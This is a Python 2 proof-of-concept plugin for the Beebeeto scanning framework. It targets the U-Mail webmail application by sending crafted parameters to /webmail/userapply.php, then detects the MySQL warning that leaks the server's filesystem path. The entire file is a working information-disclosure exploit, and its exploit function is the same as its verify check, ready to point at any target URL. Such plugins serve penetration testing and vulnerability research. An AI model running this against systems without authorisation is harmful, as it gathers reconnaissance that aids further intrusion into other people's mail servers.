#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0105',
            'name': 'U-Mail /webmail/userapply.php 路径泄漏 POC',
            'author': '叶子',
            'create_date': '2014-10-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'U-Mail',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['Information Disclosure', 'U-Mail漏洞', '/webmail/userapply.php'],
            'desc': 'N/A',
            'references': ['http://wooyun.org/bugs/wooyun-2010-049525'],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/webmail/userapply.php?execadd=333&DomainID=111'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        res = re.compile(r'supplied argument is not a valid MySQL result resource in <b>(.*)</b> on line')
        match = res.findall(content)
        if match:
            if '<b>Warning</b>:' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())